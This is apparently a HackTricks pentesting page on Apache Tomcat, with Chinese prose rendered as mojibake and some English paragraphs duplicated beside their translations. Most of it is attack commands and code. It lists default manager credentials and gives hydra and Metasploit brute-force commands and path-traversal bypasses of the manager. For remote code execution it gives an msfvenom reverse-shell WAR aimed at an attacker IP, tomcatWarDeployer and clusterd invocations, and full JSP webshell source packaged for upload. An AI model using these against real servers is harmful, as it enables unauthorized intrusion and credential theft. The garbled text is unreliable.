# Tomcat

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## å‘ç°

* å®ƒé€šå¸¸è¿è¡Œåœ¨**ç«¯å£8080**
* **å¸¸è§çš„Tomcaté”™è¯¯ï¼š**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## æšä¸¾

### ç‰ˆæœ¬
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author"
```
### å®šä½ç®¡ç†æ–‡ä»¶

æœ‰è¶£çš„æ˜¯æ‰¾åˆ°é¡µé¢ **`/manager`** å’Œ **`/host-manager`** çš„ä½ç½®ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½æœ‰ä¸åŒçš„åç§°ã€‚ä½ å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æ¥æœç´¢å®ƒä»¬ã€‚

### ç”¨æˆ·åæšä¸¾

åœ¨æŸäº› Tomcat6 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œä½ å¯ä»¥æšä¸¾ç”¨æˆ·ï¼š
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### é»˜è®¤å‡­æ®

Tomcatä¸­æœ€æœ‰è¶£çš„è·¯å¾„æ˜¯_**/manager/html**_ï¼Œåœ¨è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œ**ä½ å¯ä»¥ä¸Šä¼ å’Œéƒ¨ç½²waræ–‡ä»¶**ï¼ˆæ‰§è¡Œä»£ç ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªè·¯å¾„å—åŸºæœ¬çš„HTTPèº«ä»½éªŒè¯ä¿æŠ¤ï¼Œæœ€å¸¸è§çš„å‡­æ®æœ‰ï¼š

* admin:admin
* tomcat:tomcat
* admin:\<NOTHING>
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æµ‹è¯•è¿™äº›å‡­æ®å’Œæ›´å¤šå‡­æ®ï¼š
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
å¦ä¸€ä¸ªæœ‰è¶£çš„Tomcatè·¯å¾„æ˜¯`/manager/status`ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤å¤„æŸ¥çœ‹æ“ä½œç³»ç»Ÿå’ŒTomcatçš„ç‰ˆæœ¬ã€‚å½“æ‚¨æ— æ³•è®¿é—®`/manager/html`æ—¶ï¼Œè¿™å¯¹äºæŸ¥æ‰¾å½±å“Tomcatç‰ˆæœ¬çš„æ¼æ´éå¸¸æœ‰ç”¨ã€‚

### æš´åŠ›ç ´è§£
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST tomacat-site.internal
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <IP>
```
## Vulns

### å¯†ç å›æº¯æ³„éœ²

å°è¯•è®¿é—®`/auth.jsp`ï¼Œå¦‚æœä½ éå¸¸å¹¸è¿ï¼Œå®ƒ**å¯èƒ½ä¼šåœ¨å›æº¯ä¸­æ³„éœ²å¯†ç **ã€‚

### åŒURLç¼–ç 

ä¸€ä¸ªä¼—æ‰€å‘¨çŸ¥çš„æ¼æ´æ˜¯ä½¿ç”¨CVE-2007-1860ä¸­çš„mod_jkæ¥è®¿é—®åº”ç”¨ç¨‹åºç®¡ç†å™¨ï¼Œå®ƒå…è®¸**åŒURLç¼–ç è·¯å¾„éå†**ã€‚

ä¸ºäº†è®¿é—®Tomcatçš„ç®¡ç†Webç•Œé¢ï¼Œè¯·è½¬åˆ°ï¼š_pathTomcat/%252E%252E/manager/html_

è¯·æ³¨æ„ï¼Œä¸ºäº†ä¸Šä¼ Webshellï¼Œæ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨åŒURLç¼–ç æŠ€å·§ï¼Œå¹¶å‘é€ä¸€ä¸ªcookieå’Œ/æˆ–SSRFä»¤ç‰Œã€‚\
ä¸ºäº†è®¿é—®åé—¨ï¼Œæ‚¨å¯èƒ½è¿˜éœ€è¦ä½¿ç”¨åŒURLç¼–ç æŠ€å·§ã€‚

### /examples

ä»¥ä¸‹ç¤ºä¾‹è„šæœ¬éšApache Tomcat v4.x - v7.xä¸€èµ·æä¾›ï¼Œå¹¶å¯ä¾›æ”»å‡»è€…è·å–æœ‰å…³ç³»ç»Ÿçš„ä¿¡æ¯ã€‚è¿™äº›è„šæœ¬ä¹Ÿå·²çŸ¥å®¹æ˜“å—åˆ°è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰æ³¨å…¥çš„æ”»å‡»ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)ï¼‰ã€‚

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### è·¯å¾„éå†ï¼ˆ..;/ï¼‰

åœ¨ä¸€äº›[**Tomcatçš„æ˜“å—æ”»å‡»é…ç½®**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è·¯å¾„`/..;/`è®¿é—®Tomcatä¸­çš„å—ä¿æŠ¤ç›®å½•ã€‚

å› æ­¤ï¼Œä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥é€šè¿‡è®¿é—®`www.vulnerable.com/lalala/..;/manager/html`æ¥**è®¿é—®Tomcatç®¡ç†å™¨**é¡µé¢ã€‚

ä½¿ç”¨æ­¤æŠ€å·§ç»•è¿‡å—ä¿æŠ¤è·¯å¾„çš„**å¦ä¸€ç§æ–¹æ³•**æ˜¯è®¿é—®`http://www.vulnerable.com/;param=value/manager/html`

## RCE

æœ€åï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®Tomcat Webåº”ç”¨ç¨‹åºç®¡ç†å™¨ï¼Œæ‚¨å¯ä»¥**ä¸Šä¼ å’Œéƒ¨ç½².waræ–‡ä»¶ï¼ˆæ‰§è¡Œä»£ç ï¼‰**ã€‚

### é™åˆ¶

åªæœ‰å½“æ‚¨æ‹¥æœ‰**è¶³å¤Ÿçš„æƒé™**ï¼ˆè§’è‰²ï¼š**admin**ï¼Œ**manager**å’Œ**manager-script**ï¼‰æ—¶ï¼Œæ‚¨æ‰èƒ½éƒ¨ç½²WARã€‚è¿™äº›è¯¦ç»†ä¿¡æ¯é€šå¸¸åœ¨`/usr/share/tomcat9/etc/tomcat-users.xml`ä¸­å®šä¹‰ï¼ˆç‰ˆæœ¬å¯èƒ½æœ‰æ‰€ä¸åŒï¼‰ï¼ˆå‚è§[POST](tomcat.md#post)éƒ¨åˆ†ï¼‰ã€‚
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploitæ˜¯ä¸€æ¬¾å¹¿æ³›ä½¿ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œç”¨äºå‘ç°å’Œåˆ©ç”¨ç½‘ç»œæœåŠ¡çš„æ¼æ´ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æ¡†æ¶ï¼Œä½¿æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿè‡ªåŠ¨åŒ–æ‰§è¡Œå„ç§æ”»å‡»ï¼ŒåŒ…æ‹¬è¿œç¨‹ä»£ç æ‰§è¡Œã€ææƒã€æ¼æ´åˆ©ç”¨ç­‰ã€‚Metasploitè¿˜æä¾›äº†ä¸€ä¸ªå¹¿æ³›çš„æ¼æ´æ•°æ®åº“ï¼Œå…¶ä¸­åŒ…å«äº†å„ç§å·²çŸ¥çš„æ¼æ´å’Œåˆ©ç”¨æ¨¡å—ï¼Œä½¿æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿå¿«é€Ÿæ‰¾åˆ°å¹¶åˆ©ç”¨ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ¼æ´ã€‚
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenomåå‘Shell

MSFVenomæ˜¯Metasploit Frameworkçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆæ¶æ„è½¯ä»¶æœ‰æ•ˆè½½è·çš„å·¥å…·ã€‚ä½¿ç”¨MSFVenomï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªåå‘Shellï¼Œä»¥ä¾¿åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå»ºç«‹ä¸€ä¸ªè¿œç¨‹è¿æ¥ã€‚

ä»¥ä¸‹æ˜¯ç”ŸæˆMSFVenomåå‘Shellçš„å‘½ä»¤ï¼š

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

åœ¨ä¸Šè¿°å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨`java/jsp_shell_reverse_tcp`æœ‰æ•ˆè½½è·æ¥ç”Ÿæˆåå‘Shellã€‚`LHOST`å‚æ•°ç”¨äºæŒ‡å®šæ”»å‡»è€…çš„IPåœ°å€ï¼Œ`LPORT`å‚æ•°ç”¨äºæŒ‡å®šæ”»å‡»è€…ç›‘å¬çš„ç«¯å£ã€‚ç”Ÿæˆçš„åå‘Shellå°†ä¿å­˜ä¸º`shell.war`æ–‡ä»¶ã€‚

ä¸€æ—¦æˆ‘ä»¬æˆåŠŸç”Ÿæˆäº†åå‘Shellï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶éƒ¨ç½²åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šçš„TomcatæœåŠ¡å™¨ä¸­ã€‚å½“ç›®æ ‡ç³»ç»Ÿä¸Šçš„TomcatæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå®ƒå°†å°è¯•ä¸æ”»å‡»è€…çš„IPåœ°å€å’Œç«¯å£å»ºç«‹è¿æ¥ï¼Œä»è€Œå»ºç«‹ä¸€ä¸ªè¿œç¨‹Shellä¼šè¯ã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨åå‘Shellè¿›è¡Œæœªç»æˆæƒçš„è®¿é—®æ˜¯éæ³•çš„ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡çš„æ³•å¾‹åæœã€‚æœ¬ä¹¦ä»…æ—¨åœ¨æä¾›æœ‰å…³ç½‘ç»œå®‰å…¨çš„çŸ¥è¯†ï¼Œå¹¶å¼ºè°ƒåˆæ³•å’Œé“å¾·çš„ä½¿ç”¨ã€‚
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```
ç„¶åï¼Œ**ä¸Šä¼ `revshell.war`æ–‡ä»¶å¹¶è®¿é—®å®ƒï¼ˆ**_**/revshell/**_**ï¼‰**

### ä½¿ç”¨[tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)è¿›è¡Œç»‘å®šå’Œåå‘shell

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•ä¸èµ·ä½œç”¨ï¼ˆä¾‹å¦‚æ—§ç‰ˆæœ¬çš„sunï¼‰

#### ä¸‹è½½
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### åå‘ shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. 

To create a reverse shell, the attacker needs to set up a listener on their machine and then exploit a vulnerability on the target machine to establish the connection. Once the connection is established, the attacker can interact with the target machine's shell and execute commands as if they were physically present on the machine.

Reverse shells are commonly used in penetration testing and hacking scenarios to gain unauthorized access to a target machine. They can be used to bypass firewalls and other security measures, as the connection is initiated from the inside of the target network.

#### åå‘ shell

åå‘ shell æ˜¯ä¸€ç§ shellï¼Œå…¶ä¸­ç›®æ ‡æœºå™¨å‘èµ·ä¸æ”»å‡»è€…æœºå™¨çš„è¿æ¥ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè¿œç¨‹è®¿é—®ç›®æ ‡æœºå™¨å¹¶æ‰§è¡Œå‘½ä»¤ã€‚

è¦åˆ›å»ºä¸€ä¸ªåå‘ shellï¼Œæ”»å‡»è€…éœ€è¦åœ¨ä»–ä»¬çš„æœºå™¨ä¸Šè®¾ç½®ä¸€ä¸ªç›‘å¬å™¨ï¼Œç„¶ååˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šçš„æ¼æ´å»ºç«‹è¿æ¥ã€‚ä¸€æ—¦è¿æ¥å»ºç«‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¸ç›®æ ‡æœºå™¨çš„ shell è¿›è¡Œäº¤äº’ï¼Œå¹¶åƒä»–ä»¬å®é™…ä¸Šåœ¨æœºå™¨ä¸Šä¸€æ ·æ‰§è¡Œå‘½ä»¤ã€‚

åå‘ shell åœ¨æ¸—é€æµ‹è¯•å’Œé»‘å®¢æ”»å‡»åœºæ™¯ä¸­å¸¸è¢«ç”¨äºæœªç»æˆæƒè®¿é—®ç›®æ ‡æœºå™¨ã€‚å®ƒä»¬å¯ä»¥ç”¨äºç»•è¿‡é˜²ç«å¢™å’Œå…¶ä»–å®‰å…¨æªæ–½ï¼Œå› ä¸ºè¿æ¥æ˜¯ä»ç›®æ ‡ç½‘ç»œå†…éƒ¨å‘èµ·çš„ã€‚
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### ç»‘å®š shell

A bind shell is a type of shell that listens for incoming connections on a specific port. When a connection is established, the bind shell provides a command-line interface to interact with the target system. This can be useful for remote administration or for launching further attacks.

ä¸€ä¸ªç»‘å®š shell æ˜¯ä¸€ç§åœ¨ç‰¹å®šç«¯å£ä¸Šç›‘å¬ä¼ å…¥è¿æ¥çš„ shellã€‚å½“å»ºç«‹è¿æ¥æ—¶ï¼Œç»‘å®š shell æä¾›ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨äºä¸ç›®æ ‡ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚è¿™å¯¹äºè¿œç¨‹ç®¡ç†æˆ–å‘èµ·è¿›ä¸€æ­¥çš„æ”»å‡»éå¸¸æœ‰ç”¨ã€‚

To create a bind shell, an attacker typically exploits a vulnerability in a network service, such as a web server or an FTP server, to gain unauthorized access to the target system. Once access is obtained, the attacker can execute a command that starts a shell listening on a specific port.

ä¸ºäº†åˆ›å»ºä¸€ä¸ªç»‘å®š shellï¼Œæ”»å‡»è€…é€šå¸¸åˆ©ç”¨ç½‘ç»œæœåŠ¡ä¸­çš„æ¼æ´ï¼ˆå¦‚ Web æœåŠ¡å™¨æˆ– FTP æœåŠ¡å™¨ï¼‰æ¥è·å–å¯¹ç›®æ ‡ç³»ç»Ÿçš„æœªç»æˆæƒè®¿é—®ã€‚ä¸€æ—¦è·å¾—è®¿é—®æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œåœ¨ç‰¹å®šç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ªç›‘å¬ shellã€‚

Once the bind shell is active, the attacker can connect to it using a tool like Netcat or Telnet. This allows the attacker to execute commands on the target system and potentially gain full control over it.

ä¸€æ—¦ç»‘å®š shell æ¿€æ´»ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Netcat æˆ– Telnet ç­‰å·¥å…·è¿æ¥åˆ°å®ƒã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶æœ‰å¯èƒ½å®Œå…¨æ§åˆ¶å®ƒã€‚

It is important to note that using bind shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only, to help understand the techniques used by attackers and to better defend against them.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœªç»æˆæƒåœ°ä½¿ç”¨ç»‘å®š shell è®¿é—®ç³»ç»Ÿæ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚è¿™äº›ä¿¡æ¯ä»…ä¾›æ•™è‚²ç›®çš„ï¼Œä»¥å¸®åŠ©ç†è§£æ”»å‡»è€…ä½¿ç”¨çš„æŠ€æœ¯ï¼Œå¹¶æ›´å¥½åœ°é˜²å¾¡å®ƒä»¬ã€‚
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### ä½¿ç”¨[Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### æ‰‹åŠ¨æ–¹æ³• - Web shell

åˆ›å»ºåä¸º **index.jsp** çš„æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹[å†…å®¹](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ï¼š
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
æ‚¨è¿˜å¯ä»¥å®‰è£…è¿™ä¸ªï¼ˆå…è®¸ä¸Šä¼ ã€ä¸‹è½½å’Œæ‰§è¡Œå‘½ä»¤ï¼‰ï¼š[http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### æ‰‹åŠ¨æ–¹æ³•2

è·å–ä¸€ä¸ªJSP Web Shellï¼Œæ¯”å¦‚[è¿™ä¸ª](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªWARæ–‡ä»¶ï¼š
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcatå‡­æ®æ–‡ä»¶çš„åç§°æ˜¯ _tomcat-users.xml_
```bash
find / -name tomcat-users.xml 2>/dev/null
```
å…¶ä»–æ”¶é›†Tomcatå‡­æ®çš„æ–¹æ³•ï¼š

1. **å¼±å¯†ç æ”»å‡»**ï¼šä½¿ç”¨å¸¸è§çš„å¼±å¯†ç åˆ—è¡¨æˆ–å­—å…¸æ”»å‡»Tomcatç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™ç§æ–¹æ³•ä¾èµ–äºç”¨æˆ·ä½¿ç”¨å¼±å¯†ç çš„ä¹ æƒ¯ã€‚

2. **é»˜è®¤å‡­æ®**ï¼šå°è¯•ä½¿ç”¨Tomcaté»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•ã€‚é»˜è®¤çš„ç”¨æˆ·åæ˜¯"admin"ï¼Œå¯†ç ä¸ºç©ºã€‚

3. **å­—å…¸æ”»å‡»**ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„å­—å…¸æ–‡ä»¶ï¼ŒåŒ…å«å¸¸è§çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼Œè¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ã€‚

4. **ç¤¾äº¤å·¥ç¨‹**ï¼šé€šè¿‡ä¸ç›®æ ‡ç”¨æˆ·è¿›è¡Œäº¤æµï¼Œè·å–ä»–ä»¬çš„å‡­æ®ä¿¡æ¯ã€‚è¿™å¯ä»¥é€šè¿‡é’“é±¼æ”»å‡»ã€æ¬ºéª—æˆ–å…¶ä»–ç¤¾äº¤å·¥ç¨‹æŠ€æœ¯æ¥å®ç°ã€‚

5. **æ¼æ´åˆ©ç”¨**ï¼šåˆ©ç”¨å·²çŸ¥çš„Tomcatæ¼æ´ï¼Œå¦‚å¼±å¯†ç å­˜å‚¨ã€ç›®å½•éå†ã€èº«ä»½éªŒè¯ç»•è¿‡ç­‰ï¼Œæ¥è·å–å‡­æ®ä¿¡æ¯ã€‚

6. **ç½‘ç»œå—…æ¢**ï¼šä½¿ç”¨ç½‘ç»œå—…æ¢å·¥å…·ï¼Œå¦‚Wiresharkï¼Œæ•è·Tomcatç™»å½•è¿‡ç¨‹ä¸­çš„å‡­æ®ä¿¡æ¯ã€‚

7. **æš´åŠ›ç ´è§£**ï¼šä½¿ç”¨æš´åŠ›ç ´è§£å·¥å…·ï¼Œå¦‚Hydraæˆ–Medusaï¼Œå¯¹Tomcatè¿›è¡Œå‡­æ®ç ´è§£ã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨è¿™äº›æ–¹æ³•è¿›è¡Œæœªç»æˆæƒçš„å‡­æ®æ”¶é›†æ˜¯éæ³•çš„ï¼Œåªèƒ½åœ¨åˆæ³•çš„æ¸—é€æµ‹è¯•æˆ–æˆæƒçš„å®‰å…¨è¯„ä¼°æ´»åŠ¨ä¸­ä½¿ç”¨ã€‚
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## å…¶ä»–Tomcatæ‰«æå·¥å…·

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
